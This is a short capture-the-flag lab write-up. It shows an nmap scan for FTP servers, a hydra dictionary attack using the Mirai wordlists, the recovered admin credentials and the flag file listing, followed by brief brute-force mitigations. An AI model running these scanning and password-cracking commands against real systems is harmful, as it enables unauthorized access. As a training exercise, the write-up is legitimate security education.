# adcb1f_password_cracking

According to the course description, adcb1f is in a FTP server.

So the first step is to scan the network to find the FTP server.
```
nmap -p 21 -o scan_result.txt 10.0.0.0/20 
```

10.0.3.197 is our target.

The next step is to crack the password using hydra.
```
hydra -I -L /usr/share/wordlists/metasploit/mirai_user.txt -P /usr/share/wordlists/metasploit/mirai_pass.txt ftp://10.0.3.197


[21][ftp] host: 10.0.3.197   login: admin   password: 1111
```

The last step is to login to the FTP server and get the flag.
```
└─$ ftp 10.0.3.197      
Connected to 10.0.3.197.
220 Microsoft FTP Service
Name (10.0.3.197:jinjia): admin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||51269|)
150 Opening ASCII mode data connection.
10-06-23  01:31AM               246205 flag{adcb1ff5d608bb2b2a9fdafc41ccf0c11c44ba40b7cd2c}.jpg
226 Transfe
```


Mitigate bruteforce and dictionary attacks:
* login throttling 

Monitoring and intrusion detection/prevention solutions(NIDS):
* Snort
* Fail2Ban